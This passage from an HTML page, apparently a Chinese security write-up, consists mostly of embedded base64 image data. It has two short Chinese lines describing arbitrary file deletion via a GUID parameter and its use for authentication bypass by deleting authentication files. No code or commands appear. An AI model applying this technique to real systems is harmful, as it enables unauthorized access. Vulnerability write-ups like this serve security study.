pFMXL+sO27cS2bIS1uUfmARV9/27pXnQNdO/2aNMxtWnu8pjLn44F/1vTPgQSwG7j+I3f5uFKZ4ILBKQM0n3DbJgJtEbklYHbic7abhcPaEU+wSV/7CU+b7NwgsjaKP1JhFQguLy5t/Y+fuOJ+GntM7AbRmsetnzB0+yPf9n2VhSKZbLJyfdlwEa8uIoMNwznEwP/h5sUv9sP7fayjRc4v4kOZsN6BjdhfYZkwE5PxEIyZLOYiYoIy6heMRvgLx4MeL5nk2+wXcRz3z/kmjWmr/QkDoc32/7Jtg/9dPya0mcUitb9qV6nN+rwXMiH9Tbkzr4/Etm6/7rfBZ/b9lLsxTmptZuO36FO97fF4K37VxmexTWG99pjOy4OQjGIUzUW6AI7HiW6/xN8K20oZ6e9oHwP7w7mzlWfKPewHbjwLJ4jBgQTwMKGYCYJBxwA6wQDe0mRlhcewOdmSbbfZ4kScsuDbPtcFw23tD3Mb9SzrCyumx+O32/VkZOOic+REa23tbKxXNirDZmfZ2Ol9oA380s7AAQWwHcRpRgEo2qHAV/hqFgOS+awtoHvbmLh+aXNKi4Ca5cu9+Wi39pY3NzZuO15PGoWq8NnGshPJymZQ6rGPNb8yx8b+wh+P8McBBTAgPQIk2oQ7w4D7SFYTi/tlpLCYi+CvigHY2HTsJY4H3bg1ZWCjoxRlXuuf8jiBzNlfPoHdwaYYAbxykORjoPgcVn6Ws2mSWtnWTS9S9H03E6phfgeicNrYdCI4Ogs9nMtcduzobWVzyA58vKxfysLs5naMAFzn+I4VjfmcH8dz/BjGrP41Z4Abs9ymvhXsZG7fzdw+i8MNxxcBvOHgHA02+rPiAg7HLCIwAAMwAAMw0MwAAhhYmmFBwCJgYQAGYAAGYAAGjsAAAhgBjACGARiAARiAARiAgVMxgAAG+FMBf4RdK30g+wIDMAADMAADtzGAAEYAI4BhAAZgAAZgAAZg4FQMIIAB/lTAs2O+bceM//AfDMAADMDAERhAABcF8HA/Q3u7msrtX9x9FEs/r9sEi6mj0o5qr71t0tit1PZya6omPyU+2O0vNSX9mNN3rmEhggEYgAEYgIHpDCCAW0RIizB9mABu+2Wee4pE09Y971Hq7nd5rB9fmD6YmQDxGQzAAAzAAAy0MYAAXkoAt9RTK9MitJM67E3WSzdw12+oP5YpXmLg3F0A9z5xG5C1+7aEf6ijbXLCT/gJBmAABmBgLQYQwImgVB09Q5iq9dTamtrO2C/9uPeu5uc960ckZtlb6M9DBPDl0o1vBphElowxdcETDMAADMDAnhk4lAC2P22aZkOt+Bs+Hh/EYPxTqOl1AdhjwtRlHv3PWqq/J9/YptLOYGNu35jQtNfJeeK+ffk/6JcXsNY+34fRstr1l+4igjv5qVhfpxyJMH186p778n2/gvPW3n+NPvN9GGwYYq3Y6uI1Wiask//5kiQMwAAMwAAMHI6B0wpgI8y82Kqco1WEab7rcXX4OkPxFQhM/77SZtKOiF9drNk69fcunVxrjgQYsVkSwM42b1dv9/PuSQTrjEE/JsztUYU33ZvXvfB1fXj9puv7YW0WoR/4zNui+Cyyr/a+ZImv3U1fVozaDOPM//m4wCf4BAZgAAZgYHsMnFcAe1FlgxKLryRQiTDVQW4QwLU2w3bM/1cjDNX2wrKqIAsEpMnKirBM+uYysUuena0LYOmXs9H5xcZAhHr8nvdBpd+jcez9VPOr6svEZ5Q5XCbA80VsiS0MwAAMnIKB0wrgNHM6KpwqossunnUBXG1T2vnqqesz1Gn5cJEetTcYvLbc1dTX15kL3UEo5+/NE351AZyIXJd9trbG72U+qAl28eGn82wPfcz/+BAGYAAGYAAGjskAAtiJxVFB2SSqlhLAY2J1gHDU3kAA9wPXCNJXT92TnM+Njjv0dTrb5f05Z4CDNhHAQ5yYOPEFDMAADMAADGyPAQTw5gSwzYAaEalmbC1E7QLYilvJpNp6JcuqAOm/nDZSJhC72qBGACt+rfhM8yOv4UcYgAEYgAEYWIeB4wtgk70NjxPYj/xFEApYo4LyrhlgEZ6SlZXnCQBNNvXX2HrkeIPtZ6FOEWm1YwZSrvDY7kt3/GLCEYjRui/y5b/CeefeXhH4yXls4YDHhLNCjPETfoIBGIABGNgzA4cSwPIFJxF78jw+T7sXAdwPLDmfqwk6vR85jLac8YmIv/AIxIun7Kxxk0geE0bZpiOYJCLh7vrXKoCd/enmZeiz2zSMiFvbN3vMxHMy1hfeO8WXIQaGAlaJPbGHARiAgcMycCwB7DOAco62F47xEQARlamIyjKLIhb9uVipM76FlhxVMLdVS8oOAksXq1mbkTh0C7G3I8/ajh01KNmV9rtf+ENRaPuhCe5pwiCrU0Rp1Me6AE79OvhUscf5arSM31SEnwoodTHpHXbSQ+zCOwzAAAzAwOEE8KmgrmZE5bZftwva+/tV3zSM2TG2IQivs5uDfEMRluF/JkcYgAEYgAEYOC4DCOCdZ/pqYs5kYiX7uqu+ThTA7tjFePY3OAMcHgPZlV+OOxmx0BBbGIABGICBezGAAN69+JEvy+0xyzs20CcI4JZMeHD0oSqSd8/EmF95716TK+3AGgzAAAxslwEE8CHEjhWLawi77Cxvcs5Zzugu33a7ADZZcDK6nNk9xFje7mLBQk5sYAAGjsQAAphFE+EEAzAAAzAAAzAAA6diAAEM8KcC/ki7V/pCNgYGYAAGYAAG5jGAAEYAI4BhAAZgAAZgAAZg4FQMIIAB/lTAs1Oet1PGb/gNBmAABmDgSAwggBHACGAYgAEYgAEYgAEYOBUDCGCAPxXwR9q90heyMTAAAzAAAzAwjwEEMAIYAQwDMAADMAADMAADp2LgwALY/kDEm6+enSqgW9oJ7vdX6MLdpPuhkS3cZ9j94Ifce/l6VX7O+Rcfdz98+UX3w29+2l0u73V/fvGFef7tL8I+bfj/VvtbfMFixtwHAzAAAzBQYODAAni9H4fYksjcsi3H+IGK2wSw/SGRhX6lz4m+0R8diQTkpfv9b3oB/Hn35/c3LHrDyWmO/eZnsJXNQFgv/7MIwgAMwAAMBAwcTwCbxfDaDVmy/v+FBEjguC0Lz8faZjcesf+v3aho27RfdyaA3/+w+/7LL7rvP33PTHS7E8Bz7EcAs6hteg7ZyeYTHzKOTsbAoQSw/GyvEVtmUUT43lUMy8fS5rjAUTLw+xbAv/r08+6HLz/ufr+XiS0RwE32I4BZuPfCN3bCKgxshoEDCWAnVF5/3T3rAesXRflfAU7Ess9UzjzjaT7mT9spfFTd1qbrx1Wy2PlHu8PH6knZ1A6l32sKYmuX2NsLYPlfyYAY0SJ91LL0gfAUYe18Ep3rDsSPiYX32/zNT1yPszHlI7EpPo+rZ8E9a9knEkkcr9cu6qPEscDV1JjqovKn3bdB5tjX6QSpOVfcny0uiGlbpz1v3JeVDLSvxxxtsEcxbFZayi4gzgMGfHvis/7Rsab6NCzH/5tZmNQ4Eh/iAwMwsCADxxPATlwYMVYQhLFQs+Ksf23Ox/StAritTSecArFVuk7E1LCo59feexGxtrrjDkasFQRw/17Qx8tFBGAoWuW1XoAG9Tgx42Plnht/+DrdtYX4l/2iXede83X3vDzvnpK6rWgO7HSD1Pok7Fe+GXj+KrmuJNjuLYCTbKzxW/+a+YLd0A8raAMhq10nZ3v9F/T6692X9F582P3qlknN+CvxYVCf39AkMStzMPSNMvgCBmAABo7JwIEE8JDpEXF4jUTLEEBVtAYL5hTY1boUoaKWS9rUxVIuwCKhGdTR0kbcN1e3z5qGGdnraAY9rkd8m2Y+x4VfVEcqbFVR3Ldj2/DCvyAWdV+KnYVHVUjl/o/sFv+7mHu73Ouz7JC+p4JN4Uq1RWwqPDZngIOsbbEdJ3bTu0xkbTgBnGaGs3IFm4vt9+XVuAUxLjAyWuccO7iG7BQMwAAM7IaBYwlgA14q6nIRJgJy7IhE6+Koik5FqNTbLAuttA1bVznj1Wr7WuV8X52w9tnasYkh85nzRyoC0zqcuGlqI702eZ762fqnHJfYf4kwd3VbX+QMxtcGYs1dp9qS+Si/rlZv/74uOpUjEE7cjt1FQq/r0l1S8ewEcCqUW+ytlqkJ4CTO1foov5sFjFjOmwPwG36DgUt3QAHcg23FyNOrJ383iEwgOeFUyxbXIJkkVEbbTLOn5Wzs1gVw7zPjl1dP3ZNkl5NsvHlf3gsehzhtWwCnIl84mpUBdsJW6vCPqfi/twA2QtAK49IZ4Pg8r5zrlcfg9msIYEQlGwsYgAEY2BADxxTARihIhtQJy1RMBEHwYiwRaTXx64VeWneDUMnbbM00XrrlBLBrMxCgXnz1r6X9Cnw27htbr4hB21eJhxPH4bnevt7MZ9sVwCJ+B7E+bLqkz+IfW3YkA+z6nR7XMT5L/Z/5aF4WQ8/aKhngNN5OxIZfhNPrUuxCALPwpTzxHCZgAAYeyMCBBbCIjjYhpQqOhsBo1+kCKRcF6bXpcxFR6eNyAji3KW1r3nPrcxGIsb1uQ5JuNjJx1xY3+Ya/tDXPXusHVaxK1t7bW7LL9isVwLXzqbFvhnioLGQ+GspP6bcqWp1ATc/oZvWacmlmN3heGjOPFMCyyUg3FCVbeZ1FGQZgAAYOz8AxBbARLVYAW4ER/hBDL2BEHIuAKIiyhgGQChhpr8+kDqKssU1ZqL3YEvvix7TNTKQ02L3uNdafpv9Zn5yADG8FJiIz81lDFtpdO/g69tWkfjpbvYg1z990b15fuzBDa8RpmMGWPmq3L5P3SjF19vs25QtwWgbe1XVzX1Mx6p6nty/rhXJ6Zje744PcyaFwezTv/7TNJRk1Phw+YfBtujb0MXkDJ0vaTl2HX2RTHnnO2IOBbTBwIAHsRGz2cb62MOZlBwEyPTBWELkzuybLFAhAv8C1tpmXi8X0kkcgpvd1bOBGfgjikPs26WPvs0zclTKtic1LCuA+Vq4+exTEbpRMvyIBKyJezmn35Wyf8r6mdfbXxBuwUKBJrE2bacYy81HiC89a/XWbBZazuv0tzOwtydIMcHbGt3DLsqxcdLsz+VLcF5mgHuOp+b2KAJbvBPS+VeMzwW/NNlEnwhYGYAAGNs3AgQTwsOjngmV4jwXsDr4wgiQWefh9Ab8vKIAPFY+qAC6cO2dx2vTidChGYQ3WYGBzDBxQANvsHJmeBQTXzAFrMppp9nJmXSyCQRwRwPoEWhPAzm/hMRa4CrhibOpc4Rf8AgOHZuCAApiJncX9oAwggPXJuCiAh6M2N5+bZiHUfY9f8AsMwMBOGUAAK4ErnWW150Ll3Kd2tvigwkvx0W5EtmT/gjPJcRxdPKMzvhuNY9aXEzOIL1h09zwvYTv8wsDDGUAAA+HDIdyNmIYVWIEBGIABGICBQzCAAAbkQ4CMiN5o1prxxfiCARiAARjYIAMI4A0GBTGHmIMBGIABGIABGICB9RhAACOA2ZnCAAzAAAzAAAzAwKkYQAAD/KmAZze93m4a3+JbGIABGICBvTCAAEYAI4BhAAZgAAZgAAZg4FQMIIAB/lTA72Vnip1kUWAABmAABmBgPQYQwAhgBDAMwAAMwAAMwAAMnIoBBDDAnwp4dtPr7abxLb6FARiAARjYCwMIYAQwAhgGYAAGYAAGYAAGTsUAAhjgTwX8Xnam2EkWBQZgAAZgAAbWYwABjABGAMMADMAADMAADMDAqRj4/23h7+5emFybAAAAAElFTkSuQmCC" alt="img">img</a></h3><p>能将传入的guid传入的文件删除</p>
<h1 id="身份绕过"><a href="#身份绕过" class="headerlink" title="身份绕过"></a>身份绕过</h1><p>删文件某些时候可以删除一些认证的文件，进行文件的绕过</p>
<p><a href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYYAAABPCAYAAADvEGItAAAMpklEQVR4Ae2cP2scSROH75NspkypwHDgyInAgaNNdNiOFFzoyDjwgZUKgzODdRgFDgyX+PQRDl6wA0VCX6dfpv9Nd03Nn56Z1cyunkBIu9vTXV31TP2qu2f122azMfzgg31g4OTkxHz+/Nm8f/8eZndw3378+NF8//49/nz79s2cnZ3h6x34uuR+e/bsmbm+vo5xqWJU3QfV/VDST0nb30oa0xYBgQEYgIHDZwBhWLga4CY7/JuMGBPjfWMAYUAYdrYc3bebAXtJ4DDgGEAYEAaEAQZgAAYyBhAGgMiAoGKiaoYBGEAYEAaEAQZgAAYyBhAGgMiAoFqkWoQBGEAYEAaEAQZgAAYyBnYvDC9uzPbq3v28u8gGL6pMnlyb06t78/QFal7kN4Afzxy+w3ePlIHdC0N07IV5agXilzl5MiK5IwzcpJGlEfxwLfzAwGAGHlAYqpvZi8PltTkqDRLCMDiorCgQDhiAgSkMzCgMLun3bfUcnf8y26sRqwaEAWEoLSZoDzMwMIqBeYTBJ+3t1Y057gmEJgzH7+7Ntjp/iP24M4lMZBJhsO3DuYVYfdj+7Xth68r1dXr+apSDpqgu11K1wQAM7CMD04UhHC6LBK0745U5ubw3W9G2TvT1SqIhIKloxENsl/zTpO+uE8LibcyEpkfAdPuBHL/AAAwcPgOThCEk4TQxa9CEdu7ppOaqwglDLQquD5H0gzBEUXDBsdcmQhPGykXAC5K4VrOV9w4femJMjGGgm4HRwhCq/DwBtwxmK/amIITgyOTu3hfJPNlKCtdVv+W1ThiaY8l2aR/83RI3VlVsP8LAo2RgnDCE6n3o9woQhkcJF4KL4MLAfjIwThh8FRG2bezBcVdlgTAgDF188Bl8wMCqGJgkDLYa8Ae78kC5pFJQt3nk1pF87UGS1+pbSeK8AghXBWEJK7TdzwqUuO1X3KYLQ5Vk49ZSc2+/AsIm745tJ5ncNxvl6aUJwuDG120D2P0ClngRLxjYPQPzCIOtwF1Vrh1GDxKG8L2E8Fs+QVQkDP5/M4W+kqeWgGr3UOFjfAwD+83AjMIw3hHNFcP4vvStpPH9ATi+gwEYeGwMIAycN3DeAAMwAAMZAwgDQGRAPLbKiPmyGoCBJgMIA8KAMMAADMBAxsAqhAHFbio2PsEnMAADSzGAMFApZJXCUiAyLkkQBtbDAMKAMCAMMAADMJAxgDAARAYEVdt6qjZiQSyWYgBhQBgQBhiAARjIGEAYACIDYqkKhXGpjmFgPQwgDAgDwgADMAADGQMIA0BkQFC1radqIxbEYikGEAaEAWGAARiAgYwBhAEgMiCWqlAYl+oYBtbDAMKAMCAMMAADMJAxgDAARAYEVdt6qjZiQSyWYgBhQBgQBhiAARjIGEAYACIDYqkKhXGpjmFgPQwgDAgDwgADMAADGQMIA0BkQFC1radqIxbEYikGEAaEAWGAARiAgYwBhAEgMiCWqlAYl+oYBtbDAMKAMCAMMAADMJAxgDAARAYEVdt6qjZiQSyWYgBhQBgQBhiAARjIGEAYACIDYqkKhXGpjmFgPQwgDAgDwgADMAADGQMIA0BkQFC1radqIxbEYikGEAaEAWGAARiAgYwBhAEgMiCWqlAYl+oYBtbDAMKAMCAMMAADMJAxgDAARAYEVdt6qjZiQSyWYgBhQBgQBhiAARjIGEAYACIDYqkKhXGpjmFgPQxMFobjd/dme3VvTs9f7TjBvDInl26sarzt1S9z8mReR9q5XF6bI8RCj+XzM3P76a25ffO72WyOzZeLt/b1P8+1OPR9rl0z43snp+a/T2+NbtuM43Sy8rv559Nb89/rY92fndd22BjicHFq/hjbxwLX/fH6T3P76cz8NdPYrr/gX+fr209/mi8nHb6baexDF7E9EoYk2C9uEIYlAA8JyQrDxvz1phKGthtxWWGwSWPnibMv8fd9njBdEs8Qh53Pb6R9LXPZrTAE3uYTnkNP/l3zmywMXZ3v7DOEYd4KtOVGbsTPV+GhAu4WhnmTSsOWTpt3lJAbY/aN0/f5kj56+LHnFoaNF0i3KkQYyu6R7vgjDMnNzlZSNywbIQyz3+hJLCZBbhNG20qmZ45FNvQl/r7P57Rl/X3NzksmDH4Fu2erqEmcF7FaxsdoYQhnC26//948fdEc+Oj8l9naPfsL89SeC3SfR9j2A9ptOlYMro8bc5w5zY0vz0HkeHYuyhmDbCf7KQmu7Gv77iKr/u3nM/tMjjnF/v65hsrNnT+0bTXZ1Ua1JeXFxp5dtJ4JDOvT2ebb+u2uhr1hG6Y6K7E/Yuuh5WzC2uuTjktw4frm77Ci2mxqYcivEWNmrDbvozgHabs6RzdmVUUPGnNQnx02VbZbnzkhdqtI7xORpGthcDaGmNf+qsYptH+o7y5+mLu7O/Pz75fZ/RZ9O7SfR9JutDBEhz65NqdXHcIgD4ptUpftw8FyfqB8dH6jHzDPIAxO2HIB0VYMjXZ+vuXJNcwxHdMLZiJGdRJPfDHBZ/PZ35MctBvGJh29cq8TSJ0kXeIQ7YNwZEnm2Hx503Lw2pLYLa/VZ1kyDYJT2xCESh5ap8IQ2U8Sf/1e6qckAUb7e4RL82Pjva4+kjHjXH37aIOzMcQgm+vzs/ID+xCj+GBCneDdgwpuvFSo4pgNRhL7o726/brPU//Xf3/4984Kw93/vpqXDX/W7Ur6POS2DyIM+WpCqd47Er3q/I72LrGmybcKuhizRcwawtDSTh+jB642m0XSD8Iwi8/mtH/MzdS46WsfuaSki0BMGpvy7QGbfGJCqcdTOarm5CvmOGaLsEwSBmFPXTkPsE/1+wBh6BuzZZ6tflLt8PYHYYhC5N6X8wzCEH1t+3RCUK8avDAI+12cBC9dNsnPWDEUrZQeQBh6kvRmYxoJWQZVvm5LspuN0ZN2Lgx6m6Ydbe26trLabqxG5R7nNMS2vE01xhCfzWl/27w63+8TBnnzN5KVTBp9ibS0fdgGSR5rbdjgxpwiDHXS0xNmpw8jJ+nc+4Whb0yZtMttSOxp8ZlM5vqYMmbytR+nbQzVP4ltfF4kCIGDFQiD32IRe+3BQPX3AwmDS+bpdyfSv5OtngHwtSdyl/TDWYOezKUwDPPZnParceib91RhKE0GdrxkW0ixL2yfhP3t8DtWsS1jHpow6PMZmVBbfIYwjPSnwu2o+29CPysQhmHVb+aYBxIGPUmPC3afMIQzC31MKQzDfKb3Nc7+zP9DgZsqDL17+Olcuqpo186JgtiOkElNvvZz1RNpS3Ub/aN/rlfO6Vz6/u6a67Axp9uQ2NjiM4Qh8VFkYj/eW4UwuARWUIGXCoNtn3w7W7ve78e7p6h88LR2YwPc1pd4X0/mTWEY5DPR96jkPna+1XWThcEnQLnlpNnUlpxiW5cw08NQ6w95nXxtr/fXNuzoStAVQ8OSdB0X31/r01khqXSNO3BMG5tkCy36KYwhfvv2tw0fKNtxvi8pproYSXvla2eHfq2wsWsOr7+an3d3hsPnYT5bhTCEw+HtVX4eMeapJLf/nzz1ZJOjfEw2374J459ehsdrg/O0J4nCZ6W/fV/JE0hh3LCNVCWIocIQr+302Zz2l853DmEIfYR/wxFsaD6VJJNQnWyTa+y/8Ei2mkKyyxKxS0y1gPjX1RM3SlJUVyExQRUmOS9KdntLHOTm85lBGOK/NBErqJanktw8q8dQRftqrpqYKsKjJ3fpI/m67l+em+Q+CXHWf7/8+6d7Kunuzvy40NuU9HfobUcKg0+syXcOwvcZ0uQ+PMlVgQpJrN7HD9srNgihotfGzJJtSK6hn0psXN/t/bnVirVX9FWNre7Vl5yJxETRM8ciYRjgMz/ufPYPuKHS5Ba/K9B8rl1N5FqCSRJPOA9oJiclmUSfpza7drGfKtFrY4o5VOcPNqkpwpD+z6jQb53AdLv0BFnZ2b1iqJNz87sT8YykcJXS6LNNkIKIaj4Q/nJ+aAqIPm/pIxEjz1A9vzSeJX9/MD+qFQPfZRh0GD1SGEoCQttDry4Wn59NWslKQBUFONxZnDRxHR0DKRTzxc19l+Gn+fp6vj535tPR/ptnbgjDwgE4VLAebl5d2yrz3CQPN5c9tXcfhCGcMfz7YVDF/NhjjjAgDNwoMDCNgVULQ72FxNnC8MIDYZiSFLrOPdKzkFHnEcOD+NirG+a/MCurFoaFfTMlvyx4LcKwoPNJaNy0MAADa2QAYUAYpm0j4D/8BwMHxwDCANQHB/UaKzBsYmWwTwwgDAgDwgADMAADGQMIA0BkQOxTVYOtVOEwsBsGEAaEAWGAARiAgYyB/wPNh1eNix8eEQAAAABJRU5ErkJggg=="><img src="data:image/png;base64,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" alt="img"></a></p>
<p><a href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYYAAABPCAYAAADvEGItAAAMpklEQVR4Ae2cP2scSROH75NspkypwHDgyInAgaNNdNiOFFzoyDjwgZUKgzODdRgFDgyX+PQRDl6wA0VCX6dfpv9Nd03Nn56Z1cyunkBIu9vTXV31TP2qu2f122azMfzgg31g4OTkxHz+/Nm8f/8eZndw3378+NF8//49/nz79s2cnZ3h6x34uuR+e/bsmbm+vo5xqWJU3QfV/VDST0nb30oa0xYBgQEYgIHDZwBhWLga4CY7/JuMGBPjfWMAYUAYdrYc3bebAXtJ4DDgGEAYEAaEAQZgAAYyBhAGgMiAoGKiaoYBGEAYEAaEAQZgAAYyBhAGgMiAoFqkWoQBGEAYEAaEAQZgAAYyBnYvDC9uzPbq3v28u8gGL6pMnlyb06t78/QFal7kN4Afzxy+w3ePlIHdC0N07IV5agXilzl5MiK5IwzcpJGlEfxwLfzAwGAGHlAYqpvZi8PltTkqDRLCMDiorCgQDhiAgSkMzCgMLun3bfUcnf8y26sRqwaEAWEoLSZoDzMwMIqBeYTBJ+3t1Y057gmEJgzH7+7Ntjp/iP24M4lMZBJhsO3DuYVYfdj+7Xth68r1dXr+apSDpqgu11K1wQAM7CMD04UhHC6LBK0745U5ubw3W9G2TvT1SqIhIKloxENsl/zTpO+uE8LibcyEpkfAdPuBHL/AAAwcPgOThCEk4TQxa9CEdu7ppOaqwglDLQquD5H0gzBEUXDBsdcmQhPGykXAC5K4VrOV9w4femJMjGGgm4HRwhCq/DwBtwxmK/amIITgyOTu3hfJPNlKCtdVv+W1ThiaY8l2aR/83RI3VlVsP8LAo2RgnDCE6n3o9woQhkcJF4KL4MLAfjIwThh8FRG2bezBcVdlgTAgDF188Bl8wMCqGJgkDLYa8Ae78kC5pFJQt3nk1pF87UGS1+pbSeK8AghXBWEJK7TdzwqUuO1X3KYLQ5Vk49ZSc2+/AsIm745tJ5ncNxvl6aUJwuDG120D2P0ClngRLxjYPQPzCIOt